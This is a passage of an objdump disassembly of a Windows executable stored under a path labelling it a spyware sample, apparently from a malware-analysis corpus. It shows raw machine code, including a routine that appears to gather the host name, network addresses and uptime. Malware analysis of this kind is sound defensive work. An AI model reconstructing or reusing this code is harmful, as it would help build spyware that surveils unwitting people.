
malware_samples/spyware/dd3d4a55e3352233b34e6567dffc8252331ef7199b43c2c1ed010f0464fc464f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	56                   	push   %esi
  401004:	8b f1                	mov    %ecx,%esi
  401006:	8b 46 04             	mov    0x4(%esi),%eax
  401009:	c7 06 b4 87 42 00    	movl   $0x4287b4,(%esi)
  40100f:	85 c0                	test   %eax,%eax
  401011:	74 0e                	je     0x401021
  401013:	68 00 80 00 00       	push   $0x8000
  401018:	6a 00                	push   $0x0
  40101a:	50                   	push   %eax
  40101b:	ff 15 84 51 42 00    	call   *0x425184
  401021:	8d 46 10             	lea    0x10(%esi),%eax
  401024:	50                   	push   %eax
  401025:	ff 15 80 51 42 00    	call   *0x425180
  40102b:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40102f:	74 09                	je     0x40103a
  401031:	56                   	push   %esi
  401032:	e8 96 14 01 00       	call   0x4124cd
  401037:	83 c4 04             	add    $0x4,%esp
  40103a:	8b c6                	mov    %esi,%eax
  40103c:	5e                   	pop    %esi
  40103d:	5d                   	pop    %ebp
  40103e:	c2 04 00             	ret    $0x4
  401041:	cc                   	int3
  401042:	cc                   	int3
  401043:	cc                   	int3
  401044:	cc                   	int3
  401045:	cc                   	int3
  401046:	cc                   	int3
  401047:	cc                   	int3
  401048:	cc                   	int3
  401049:	cc                   	int3
  40104a:	cc                   	int3
  40104b:	cc                   	int3
  40104c:	cc                   	int3
  40104d:	cc                   	int3
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	55                   	push   %ebp
  401051:	8b ec                	mov    %esp,%ebp
  401053:	56                   	push   %esi
  401054:	57                   	push   %edi
  401055:	8b f0                	mov    %eax,%esi
  401057:	8d 7e 10             	lea    0x10(%esi),%edi
  40105a:	57                   	push   %edi
  40105b:	ff 15 7c 51 42 00    	call   *0x42517c
  401061:	8b 46 04             	mov    0x4(%esi),%eax
  401064:	85 c0                	test   %eax,%eax
  401066:	75 04                	jne    0x40106c
  401068:	33 c9                	xor    %ecx,%ecx
  40106a:	eb 05                	jmp    0x401071
  40106c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40106f:	2b c8                	sub    %eax,%ecx
  401071:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  401074:	e8 d7 00 00 00       	call   0x401150
  401079:	83 f8 ff             	cmp    $0xffffffff,%eax
  40107c:	75 0f                	jne    0x40108d
  40107e:	57                   	push   %edi
  40107f:	ff 15 78 51 42 00    	call   *0x425178
  401085:	5f                   	pop    %edi
  401086:	33 c0                	xor    %eax,%eax
  401088:	5e                   	pop    %esi
  401089:	5d                   	pop    %ebp
  40108a:	c2 04 00             	ret    $0x4
  40108d:	8b 45 08             	mov    0x8(%ebp),%eax
  401090:	8b 4e 08             	mov    0x8(%esi),%ecx
  401093:	53                   	push   %ebx
  401094:	50                   	push   %eax
  401095:	51                   	push   %ecx
  401096:	e8 95 34 01 00       	call   0x414530
  40109b:	01 5e 08             	add    %ebx,0x8(%esi)
  40109e:	83 c4 0c             	add    $0xc,%esp
  4010a1:	57                   	push   %edi
  4010a2:	ff 15 78 51 42 00    	call   *0x425178
  4010a8:	5f                   	pop    %edi
  4010a9:	8b c3                	mov    %ebx,%eax
  4010ab:	5e                   	pop    %esi
  4010ac:	5d                   	pop    %ebp
  4010ad:	c2 04 00             	ret    $0x4
  4010b0:	55                   	push   %ebp
  4010b1:	8b ec                	mov    %esp,%ebp
  4010b3:	53                   	push   %ebx
  4010b4:	56                   	push   %esi
  4010b5:	8b f1                	mov    %ecx,%esi
  4010b7:	57                   	push   %edi
  4010b8:	8d 5e 10             	lea    0x10(%esi),%ebx
  4010bb:	53                   	push   %ebx
  4010bc:	8b f8                	mov    %eax,%edi
  4010be:	ff 15 7c 51 42 00    	call   *0x42517c
  4010c4:	3b 7e 0c             	cmp    0xc(%esi),%edi
  4010c7:	76 10                	jbe    0x4010d9
  4010c9:	53                   	push   %ebx
  4010ca:	ff 15 78 51 42 00    	call   *0x425178
  4010d0:	5f                   	pop    %edi
  4010d1:	5e                   	pop    %esi
  4010d2:	33 c0                	xor    %eax,%eax
  4010d4:	5b                   	pop    %ebx
  4010d5:	5d                   	pop    %ebp
  4010d6:	c2 04 00             	ret    $0x4
  4010d9:	8b 46 04             	mov    0x4(%esi),%eax
  4010dc:	85 c0                	test   %eax,%eax
  4010de:	75 04                	jne    0x4010e4
  4010e0:	33 c9                	xor    %ecx,%ecx
  4010e2:	eb 05                	jmp    0x4010e9
  4010e4:	8b 4e 08             	mov    0x8(%esi),%ecx
  4010e7:	2b c8                	sub    %eax,%ecx
  4010e9:	3b f9                	cmp    %ecx,%edi
  4010eb:	76 0d                	jbe    0x4010fa
  4010ed:	85 c0                	test   %eax,%eax
  4010ef:	75 04                	jne    0x4010f5
  4010f1:	33 ff                	xor    %edi,%edi
  4010f3:	eb 2d                	jmp    0x401122
  4010f5:	8b 7e 08             	mov    0x8(%esi),%edi
  4010f8:	2b f8                	sub    %eax,%edi
  4010fa:	85 ff                	test   %edi,%edi
  4010fc:	74 24                	je     0x401122
  4010fe:	57                   	push   %edi
  4010ff:	50                   	push   %eax
  401100:	8b 45 08             	mov    0x8(%ebp),%eax
  401103:	50                   	push   %eax
  401104:	e8 27 34 01 00       	call   0x414530
  401109:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40110c:	8b 46 04             	mov    0x4(%esi),%eax
  40110f:	2b cf                	sub    %edi,%ecx
  401111:	51                   	push   %ecx
  401112:	8d 14 38             	lea    (%eax,%edi,1),%edx
  401115:	52                   	push   %edx
  401116:	50                   	push   %eax
  401117:	e8 c4 13 01 00       	call   0x4124e0
  40111c:	83 c4 18             	add    $0x18,%esp
  40111f:	29 7e 08             	sub    %edi,0x8(%esi)
  401122:	8b 46 04             	mov    0x4(%esi),%eax
  401125:	85 c0                	test   %eax,%eax
  401127:	75 04                	jne    0x40112d
  401129:	33 d2                	xor    %edx,%edx
  40112b:	eb 05                	jmp    0x401132
  40112d:	8b 56 08             	mov    0x8(%esi),%edx
  401130:	2b d0                	sub    %eax,%edx
  401132:	e8 d9 00 00 00       	call   0x401210
  401137:	53                   	push   %ebx
  401138:	ff 15 78 51 42 00    	call   *0x425178
  40113e:	8b c7                	mov    %edi,%eax
  401140:	5f                   	pop    %edi
  401141:	5e                   	pop    %esi
  401142:	5b                   	pop    %ebx
  401143:	5d                   	pop    %ebp
  401144:	c2 04 00             	ret    $0x4
  401147:	cc                   	int3
  401148:	cc                   	int3
  401149:	cc                   	int3
  40114a:	cc                   	int3
  40114b:	cc                   	int3
  40114c:	cc                   	int3
  40114d:	cc                   	int3
  40114e:	cc                   	int3
  40114f:	cc                   	int3
  401150:	55                   	push   %ebp
  401151:	8b ec                	mov    %esp,%ebp
  401153:	83 ec 0c             	sub    $0xc,%esp
  401156:	3b 46 0c             	cmp    0xc(%esi),%eax
  401159:	73 06                	jae    0x401161
  40115b:	33 c0                	xor    %eax,%eax
  40115d:	8b e5                	mov    %ebp,%esp
  40115f:	5d                   	pop    %ebp
  401160:	c3                   	ret
  401161:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401164:	db 45 f8             	fildl  -0x8(%ebp)
  401167:	53                   	push   %ebx
  401168:	85 c0                	test   %eax,%eax
  40116a:	79 06                	jns    0x401172
  40116c:	dc 05 10 99 42 00    	faddl  0x429910
  401172:	dc 0d 08 99 42 00    	fmull  0x429908
  401178:	83 ec 08             	sub    $0x8,%esp
  40117b:	dd 1c 24             	fstpl  (%esp)
  40117e:	e8 2d 12 01 00       	call   0x4123b0
  401183:	d9 7d fe             	fnstcw -0x2(%ebp)
  401186:	83 c4 08             	add    $0x8,%esp
  401189:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  40118d:	0d 00 0c 00 00       	or     $0xc00,%eax
  401192:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401195:	6a 04                	push   $0x4
  401197:	68 00 10 00 00       	push   $0x1000
  40119c:	d9 6d f8             	fldcw  -0x8(%ebp)
  40119f:	df 7d f4             	fistpll -0xc(%ebp)
  4011a2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4011a5:	c1 e0 0a             	shl    $0xa,%eax
  4011a8:	50                   	push   %eax
  4011a9:	d9 6d fe             	fldcw  -0x2(%ebp)
  4011ac:	6a 00                	push   $0x0
  4011ae:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011b1:	ff 15 74 51 42 00    	call   *0x425174
  4011b7:	8b d8                	mov    %eax,%ebx
  4011b9:	85 db                	test   %ebx,%ebx
  4011bb:	75 08                	jne    0x4011c5
  4011bd:	83 c8 ff             	or     $0xffffffff,%eax
  4011c0:	5b                   	pop    %ebx
  4011c1:	8b e5                	mov    %ebp,%esp
  4011c3:	5d                   	pop    %ebp
  4011c4:	c3                   	ret
  4011c5:	8b 46 04             	mov    0x4(%esi),%eax
  4011c8:	57                   	push   %edi
  4011c9:	85 c0                	test   %eax,%eax
  4011cb:	75 04                	jne    0x4011d1
  4011cd:	33 ff                	xor    %edi,%edi
  4011cf:	eb 05                	jmp    0x4011d6
  4011d1:	8b 7e 08             	mov    0x8(%esi),%edi
  4011d4:	2b f8                	sub    %eax,%edi
  4011d6:	57                   	push   %edi
  4011d7:	50                   	push   %eax
  4011d8:	53                   	push   %ebx
  4011d9:	e8 52 33 01 00       	call   0x414530
  4011de:	8b 46 04             	mov    0x4(%esi),%eax
  4011e1:	83 c4 0c             	add    $0xc,%esp
  4011e4:	85 c0                	test   %eax,%eax
  4011e6:	74 0e                	je     0x4011f6
  4011e8:	68 00 80 00 00       	push   $0x8000
  4011ed:	6a 00                	push   $0x0
  4011ef:	50                   	push   %eax
  4011f0:	ff 15 84 51 42 00    	call   *0x425184
  4011f6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4011f9:	03 fb                	add    %ebx,%edi
  4011fb:	89 7e 08             	mov    %edi,0x8(%esi)
  4011fe:	5f                   	pop    %edi
  4011ff:	89 5e 04             	mov    %ebx,0x4(%esi)
  401202:	89 46 0c             	mov    %eax,0xc(%esi)
  401205:	5b                   	pop    %ebx
  401206:	8b e5                	mov    %ebp,%esp
  401208:	5d                   	pop    %ebp
  401209:	c3                   	ret
  40120a:	cc                   	int3
  40120b:	cc                   	int3
  40120c:	cc                   	int3
  40120d:	cc                   	int3
  40120e:	cc                   	int3
  40120f:	cc                   	int3
  401210:	55                   	push   %ebp
  401211:	8b ec                	mov    %esp,%ebp
  401213:	8b 4e 04             	mov    0x4(%esi),%ecx
  401216:	83 ec 0c             	sub    $0xc,%esp
  401219:	85 c9                	test   %ecx,%ecx
  40121b:	74 0f                	je     0x40122c
  40121d:	8b 46 08             	mov    0x8(%esi),%eax
  401220:	2b c1                	sub    %ecx,%eax
  401222:	3b d0                	cmp    %eax,%edx
  401224:	73 06                	jae    0x40122c
  401226:	33 c0                	xor    %eax,%eax
  401228:	8b e5                	mov    %ebp,%esp
  40122a:	5d                   	pop    %ebp
  40122b:	c3                   	ret
  40122c:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40122f:	db 45 f8             	fildl  -0x8(%ebp)
  401232:	53                   	push   %ebx
  401233:	85 d2                	test   %edx,%edx
  401235:	79 06                	jns    0x40123d
  401237:	dc 05 10 99 42 00    	faddl  0x429910
  40123d:	dc 0d 08 99 42 00    	fmull  0x429908
  401243:	83 ec 08             	sub    $0x8,%esp
  401246:	dd 1c 24             	fstpl  (%esp)
  401249:	e8 62 11 01 00       	call   0x4123b0
  40124e:	d9 7d fe             	fnstcw -0x2(%ebp)
  401251:	83 c4 08             	add    $0x8,%esp
  401254:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  401258:	0d 00 0c 00 00       	or     $0xc00,%eax
  40125d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401260:	d9 6d f8             	fldcw  -0x8(%ebp)
  401263:	df 7d f4             	fistpll -0xc(%ebp)
  401266:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  401269:	c1 e3 0a             	shl    $0xa,%ebx
  40126c:	d9 6d fe             	fldcw  -0x2(%ebp)
  40126f:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  401272:	73 07                	jae    0x40127b
  401274:	33 c0                	xor    %eax,%eax
  401276:	5b                   	pop    %ebx
  401277:	8b e5                	mov    %ebp,%esp
  401279:	5d                   	pop    %ebp
  40127a:	c3                   	ret
  40127b:	57                   	push   %edi
  40127c:	6a 04                	push   $0x4
  40127e:	68 00 10 00 00       	push   $0x1000
  401283:	53                   	push   %ebx
  401284:	6a 00                	push   $0x0
  401286:	ff 15 74 51 42 00    	call   *0x425174
  40128c:	8b 4e 04             	mov    0x4(%esi),%ecx
  40128f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401292:	85 c9                	test   %ecx,%ecx
  401294:	75 04                	jne    0x40129a
  401296:	33 ff                	xor    %edi,%edi
  401298:	eb 05                	jmp    0x40129f
  40129a:	8b 7e 08             	mov    0x8(%esi),%edi
  40129d:	2b f9                	sub    %ecx,%edi
  40129f:	57                   	push   %edi
  4012a0:	51                   	push   %ecx
  4012a1:	50                   	push   %eax
  4012a2:	e8 89 32 01 00       	call   0x414530
  4012a7:	8b 46 04             	mov    0x4(%esi),%eax
  4012aa:	83 c4 0c             	add    $0xc,%esp
  4012ad:	85 c0                	test   %eax,%eax
  4012af:	74 0e                	je     0x4012bf
  4012b1:	68 00 80 00 00       	push   $0x8000
  4012b6:	6a 00                	push   $0x0
  4012b8:	50                   	push   %eax
  4012b9:	ff 15 84 51 42 00    	call   *0x425184
  4012bf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4012c2:	03 f8                	add    %eax,%edi
  4012c4:	89 7e 08             	mov    %edi,0x8(%esi)
  4012c7:	89 46 04             	mov    %eax,0x4(%esi)
  4012ca:	5f                   	pop    %edi
  4012cb:	89 5e 0c             	mov    %ebx,0xc(%esi)
  4012ce:	8b c3                	mov    %ebx,%eax
  4012d0:	5b                   	pop    %ebx
  4012d1:	8b e5                	mov    %ebp,%esp
  4012d3:	5d                   	pop    %ebp
  4012d4:	c3                   	ret
  4012d5:	cc                   	int3
  4012d6:	cc                   	int3
  4012d7:	cc                   	int3
  4012d8:	cc                   	int3
  4012d9:	cc                   	int3
  4012da:	cc                   	int3
  4012db:	cc                   	int3
  4012dc:	cc                   	int3
  4012dd:	cc                   	int3
  4012de:	cc                   	int3
  4012df:	cc                   	int3
  4012e0:	56                   	push   %esi
  4012e1:	8b 37                	mov    (%edi),%esi
  4012e3:	85 f6                	test   %esi,%esi
  4012e5:	74 3e                	je     0x401325
  4012e7:	8d 46 08             	lea    0x8(%esi),%eax
  4012ea:	50                   	push   %eax
  4012eb:	ff 15 70 51 42 00    	call   *0x425170
  4012f1:	85 c0                	test   %eax,%eax
  4012f3:	75 2a                	jne    0x40131f
  4012f5:	85 f6                	test   %esi,%esi
  4012f7:	74 26                	je     0x40131f
  4012f9:	8b 06                	mov    (%esi),%eax
  4012fb:	85 c0                	test   %eax,%eax
  4012fd:	74 07                	je     0x401306
  4012ff:	50                   	push   %eax
  401300:	ff 15 48 52 42 00    	call   *0x425248
  401306:	8b 46 04             	mov    0x4(%esi),%eax
  401309:	85 c0                	test   %eax,%eax
  40130b:	74 09                	je     0x401316
  40130d:	50                   	push   %eax
  40130e:	e8 ba 11 01 00       	call   0x4124cd
  401313:	83 c4 04             	add    $0x4,%esp
  401316:	56                   	push   %esi
  401317:	e8 b1 11 01 00       	call   0x4124cd
  40131c:	83 c4 04             	add    $0x4,%esp
  40131f:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401325:	5e                   	pop    %esi
  401326:	c3                   	ret
  401327:	cc                   	int3
  401328:	cc                   	int3
  401329:	cc                   	int3
  40132a:	cc                   	int3
  40132b:	cc                   	int3
  40132c:	cc                   	int3
  40132d:	cc                   	int3
  40132e:	cc                   	int3
  40132f:	cc                   	int3
  401330:	55                   	push   %ebp
  401331:	8b ec                	mov    %esp,%ebp
  401333:	6a ff                	push   $0xffffffff
  401335:	68 8b 3d 42 00       	push   $0x423d8b
  40133a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401340:	50                   	push   %eax
  401341:	51                   	push   %ecx
  401342:	56                   	push   %esi
  401343:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  401348:	33 c5                	xor    %ebp,%eax
  40134a:	50                   	push   %eax
  40134b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40134e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401354:	85 db                	test   %ebx,%ebx
  401356:	74 17                	je     0x40136f
  401358:	8b 45 08             	mov    0x8(%ebp),%eax
  40135b:	8b 00                	mov    (%eax),%eax
  40135d:	85 c0                	test   %eax,%eax
  40135f:	74 04                	je     0x401365
  401361:	8b 00                	mov    (%eax),%eax
  401363:	eb 02                	jmp    0x401367
  401365:	33 c0                	xor    %eax,%eax
  401367:	3b c3                	cmp    %ebx,%eax
  401369:	0f 84 a9 00 00 00    	je     0x401418
  40136f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401372:	8b 31                	mov    (%ecx),%esi
  401374:	85 f6                	test   %esi,%esi
  401376:	74 41                	je     0x4013b9
  401378:	8d 56 08             	lea    0x8(%esi),%edx
  40137b:	52                   	push   %edx
  40137c:	ff 15 70 51 42 00    	call   *0x425170
  401382:	85 c0                	test   %eax,%eax
  401384:	75 2a                	jne    0x4013b0
  401386:	85 f6                	test   %esi,%esi
  401388:	74 26                	je     0x4013b0
  40138a:	8b 06                	mov    (%esi),%eax
  40138c:	85 c0                	test   %eax,%eax
  40138e:	74 07                	je     0x401397
  401390:	50                   	push   %eax
  401391:	ff 15 48 52 42 00    	call   *0x425248
  401397:	8b 46 04             	mov    0x4(%esi),%eax
  40139a:	85 c0                	test   %eax,%eax
  40139c:	74 09                	je     0x4013a7
  40139e:	50                   	push   %eax
  40139f:	e8 29 11 01 00       	call   0x4124cd
  4013a4:	83 c4 04             	add    $0x4,%esp
  4013a7:	56                   	push   %esi
  4013a8:	e8 20 11 01 00       	call   0x4124cd
  4013ad:	83 c4 04             	add    $0x4,%esp
  4013b0:	8b 45 08             	mov    0x8(%ebp),%eax
  4013b3:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4013b9:	6a 0c                	push   $0xc
  4013bb:	e8 67 15 01 00       	call   0x412927
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	83 c4 04             	add    $0x4,%esp
  4013c5:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4013c8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4013cf:	85 f6                	test   %esi,%esi
  4013d1:	74 29                	je     0x4013fc
  4013d3:	53                   	push   %ebx
  4013d4:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4013db:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  4013e2:	ff 15 4c 52 42 00    	call   *0x42524c
  4013e8:	89 06                	mov    %eax,(%esi)
  4013ea:	85 c0                	test   %eax,%eax
  4013ec:	75 10                	jne    0x4013fe
  4013ee:	85 db                	test   %ebx,%ebx
  4013f0:	74 0c                	je     0x4013fe
  4013f2:	68 0e 00 07 80       	push   $0x8007000e
  4013f7:	e8 c4 19 02 00       	call   0x422dc0
  4013fc:	33 f6                	xor    %esi,%esi
  4013fe:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401401:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401408:	89 31                	mov    %esi,(%ecx)
  40140a:	85 f6                	test   %esi,%esi
  40140c:	75 0a                	jne    0x401418
  40140e:	68 0e 00 07 80       	push   $0x8007000e
  401413:	e8 a8 19 02 00       	call   0x422dc0
  401418:	8b 45 08             	mov    0x8(%ebp),%eax
  40141b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40141e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401425:	59                   	pop    %ecx
  401426:	5e                   	pop    %esi
  401427:	8b e5                	mov    %ebp,%esp
  401429:	5d                   	pop    %ebp
  40142a:	c2 04 00             	ret    $0x4
  40142d:	cc                   	int3
  40142e:	cc                   	int3
  40142f:	cc                   	int3
  401430:	c7 01 50 55 42 00    	movl   $0x425550,(%ecx)
  401436:	e9 6e 16 01 00       	jmp    0x412aa9
  40143b:	cc                   	int3
  40143c:	cc                   	int3
  40143d:	cc                   	int3
  40143e:	cc                   	int3
  40143f:	cc                   	int3
  401440:	55                   	push   %ebp
  401441:	8b ec                	mov    %esp,%ebp
  401443:	56                   	push   %esi
  401444:	8b f1                	mov    %ecx,%esi
  401446:	c7 06 50 55 42 00    	movl   $0x425550,(%esi)
  40144c:	e8 58 16 01 00       	call   0x412aa9
  401451:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401455:	74 09                	je     0x401460
  401457:	56                   	push   %esi
  401458:	e8 70 10 01 00       	call   0x4124cd
  40145d:	83 c4 04             	add    $0x4,%esp
  401460:	8b c6                	mov    %esi,%eax
  401462:	5e                   	pop    %esi
  401463:	5d                   	pop    %ebp
  401464:	c2 04 00             	ret    $0x4
  401467:	cc                   	int3
  401468:	cc                   	int3
  401469:	cc                   	int3
  40146a:	cc                   	int3
  40146b:	cc                   	int3
  40146c:	cc                   	int3
  40146d:	cc                   	int3
  40146e:	cc                   	int3
  40146f:	cc                   	int3
  401470:	55                   	push   %ebp
  401471:	8b ec                	mov    %esp,%ebp
  401473:	b8 68 21 00 00       	mov    $0x2168,%eax
  401478:	e8 c3 35 01 00       	call   0x414a40
  40147d:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  401482:	33 c5                	xor    %ebp,%eax
  401484:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401487:	8b 45 08             	mov    0x8(%ebp),%eax
  40148a:	53                   	push   %ebx
  40148b:	56                   	push   %esi
  40148c:	57                   	push   %edi
  40148d:	68 90 0f 00 00       	push   $0xf90
  401492:	89 85 c4 de ff ff    	mov    %eax,-0x213c(%ebp)
  401498:	89 8d bc de ff ff    	mov    %ecx,-0x2144(%ebp)
  40149e:	e8 84 14 01 00       	call   0x412927
  4014a3:	83 c4 04             	add    $0x4,%esp
  4014a6:	68 90 0f 00 00       	push   $0xf90
  4014ab:	8b f8                	mov    %eax,%edi
  4014ad:	6a 00                	push   $0x0
  4014af:	57                   	push   %edi
  4014b0:	89 bd c0 de ff ff    	mov    %edi,-0x2140(%ebp)
  4014b6:	e8 75 2d 01 00       	call   0x414230
  4014bb:	83 c4 0c             	add    $0xc,%esp
  4014be:	68 00 01 00 00       	push   $0x100
  4014c3:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  4014c9:	6a 00                	push   $0x0
  4014cb:	52                   	push   %edx
  4014cc:	c6 07 03             	movb   $0x3,(%edi)
  4014cf:	e8 5c 2d 01 00       	call   0x414230
  4014d4:	83 c4 0c             	add    $0xc,%esp
  4014d7:	68 00 01 00 00       	push   $0x100
  4014dc:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  4014e2:	6a 00                	push   $0x0
  4014e4:	50                   	push   %eax
  4014e5:	e8 46 2d 01 00       	call   0x414230
  4014ea:	83 c4 0c             	add    $0xc,%esp
  4014ed:	68 00 01 00 00       	push   $0x100
  4014f2:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  4014f8:	51                   	push   %ecx
  4014f9:	ff 15 04 53 42 00    	call   *0x425304
  4014ff:	8d 95 f4 fd ff ff    	lea    -0x20c(%ebp),%edx
  401505:	52                   	push   %edx
  401506:	ff 15 00 53 42 00    	call   *0x425300
  40150c:	8b f0                	mov    %eax,%esi
  40150e:	85 f6                	test   %esi,%esi
  401510:	0f 84 97 00 00 00    	je     0x4015ad
  401516:	8b 46 0c             	mov    0xc(%esi),%eax
  401519:	8b 08                	mov    (%eax),%ecx
  40151b:	8b 11                	mov    (%ecx),%edx
  40151d:	52                   	push   %edx
  40151e:	ff 15 fc 52 42 00    	call   *0x4252fc
  401524:	50                   	push   %eax
  401525:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40152b:	68 00 01 00 00       	push   $0x100
  401530:	50                   	push   %eax
  401531:	e8 e0 15 01 00       	call   0x412b16
  401536:	83 c4 0c             	add    $0xc,%esp
  401539:	68 14 8d 42 00       	push   $0x428d14
  40153e:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  401544:	68 00 01 00 00       	push   $0x100
  401549:	51                   	push   %ecx
  40154a:	e8 c7 15 01 00       	call   0x412b16
  40154f:	0f bf 56 0a          	movswl 0xa(%esi),%edx
  401553:	8b 46 0c             	mov    0xc(%esi),%eax
  401556:	03 10                	add    (%eax),%edx
  401558:	83 c4 0c             	add    $0xc,%esp
  40155b:	3b 16                	cmp    (%esi),%edx
  40155d:	73 4e                	jae    0x4015ad
  40155f:	33 db                	xor    %ebx,%ebx
  401561:	8b 44 03 04          	mov    0x4(%ebx,%eax,1),%eax
  401565:	8b 08                	mov    (%eax),%ecx
  401567:	83 c3 04             	add    $0x4,%ebx
  40156a:	51                   	push   %ecx
  40156b:	ff 15 fc 52 42 00    	call   *0x4252fc
  401571:	50                   	push   %eax
  401572:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  401578:	68 00 01 00 00       	push   $0x100
  40157d:	52                   	push   %edx
  40157e:	e8 93 15 01 00       	call   0x412b16
  401583:	83 c4 0c             	add    $0xc,%esp
  401586:	68 14 8d 42 00       	push   $0x428d14
  40158b:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  401591:	68 00 01 00 00       	push   $0x100
  401596:	50                   	push   %eax
  401597:	e8 7a 15 01 00       	call   0x412b16
  40159c:	0f bf 4e 0a          	movswl 0xa(%esi),%ecx
  4015a0:	8b 46 0c             	mov    0xc(%esi),%eax
  4015a3:	03 0c 03             	add    (%ebx,%eax,1),%ecx
  4015a6:	83 c4 0c             	add    $0xc,%esp
  4015a9:	3b 0e                	cmp    (%esi),%ecx
  4015ab:	72 b4                	jb     0x401561
  4015ad:	8b 1d 68 51 42 00    	mov    0x425168,%ebx
  4015b3:	6a 00                	push   $0x0
  4015b5:	6a 00                	push   $0x0
  4015b7:	6a ff                	push   $0xffffffff
  4015b9:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  4015bf:	52                   	push   %edx
  4015c0:	6a 00                	push   $0x0
  4015c2:	6a 00                	push   $0x0
  4015c4:	ff d3                	call   *%ebx
  4015c6:	50                   	push   %eax
  4015c7:	8d 47 02             	lea    0x2(%edi),%eax
  4015ca:	50                   	push   %eax
  4015cb:	6a ff                	push   $0xffffffff
  4015cd:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  4015d3:	51                   	push   %ecx
  4015d4:	6a 00                	push   $0x0
  4015d6:	6a 00                	push   $0x0
  4015d8:	ff d3                	call   *%ebx
  4015da:	8d 95 ec fd ff ff    	lea    -0x214(%ebp),%edx
  4015e0:	52                   	push   %edx
  4015e1:	c7 85 ec fd ff ff 08 	movl   $0x8,-0x214(%ebp)
  4015e8:	00 00 00 
  4015eb:	ff 15 b4 52 42 00    	call   *0x4252b4
  4015f1:	ff 15 4c 51 42 00    	call   *0x42514c
  4015f7:	2b 85 f0 fd ff ff    	sub    -0x210(%ebp),%eax
  4015fd:	3d 20 bf 02 00       	cmp    $0x2bf20,%eax
  401602:	77 10                	ja     0x401614
  401604:	68 20 8d 42 00       	push   $0x428d20
  401609:	6a 0a                	push   $0xa
  40160b:	8d 87 00 02 00 00    	lea    0x200(%edi),%eax
  401611:	50                   	push   %eax
  401612:	eb 0e                	jmp    0x401622
  401614:	68 24 8d 42 00       	push   $0x428d24
  401619:	6a 0a                	push   $0xa
  40161b:	8d 8f 00 02 00 00    	lea    0x200(%edi),%ecx
  401621:	51                   	push   %ecx
  401622:	e8 53 16 01 00       	call   0x412c7a
  401627:	83 c4 0c             	add    $0xc,%esp
  40162a:	6a 00                	push   $0x0
  40162c:	6a 00                	push   $0x0
  40162e:	6a ff                	push   $0xffffffff
  401630:	8d 95 f4 fd ff ff    	lea    -0x20c(%ebp),%edx
  401636:	52                   	push   %edx
  401637:	6a 00                	push   $0x0
  401639:	6a 00                	push   $0x0
  40163b:	ff d3                	call   *%ebx
  40163d:	50                   	push   %eax
  40163e:	8d b7 14 02 00 00    	lea    0x214(%edi),%esi
  401644:	56                   	push   %esi
  401645:	6a ff                	push   $0xffffffff
  401647:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  40164d:	50                   	push   %eax
  40164e:	6a 00                	push   $0x0
  401650:	6a 00                	push   $0x0
  401652:	89 b5 cc de ff ff    	mov    %esi,-0x2134(%ebp)
  401658:	ff d3                	call   *%ebx
  40165a:	e8 e1 1c 00 00       	call   0x403340
  40165f:	8b d8                	mov    %eax,%ebx
  401661:	53                   	push   %ebx
  401662:	56                   	push   %esi
  401663:	68 28 8d 42 00       	push   $0x428d28
  401668:	6a 64                	push   $0x64
  40166a:	56                   	push   %esi
  40166b:	e8 37 13 01 00       	call   0x4129a7
  401670:	83 c4 14             	add    $0x14,%esp
  401673:	85 db                	test   %ebx,%ebx
  401675:	74 09                	je     0x401680
  401677:	53                   	push   %ebx
  401678:	e8 83 14 01 00       	call   0x412b00
  40167d:	83 c4 04             	add    $0x4,%esp
  401680:	8d 9f dc 02 00 00    	lea    0x2dc(%edi),%ebx
  401686:	68 68 91 42 00       	push   $0x429168
  40168b:	89 9d c8 de ff ff    	mov    %ebx,-0x2138(%ebp)
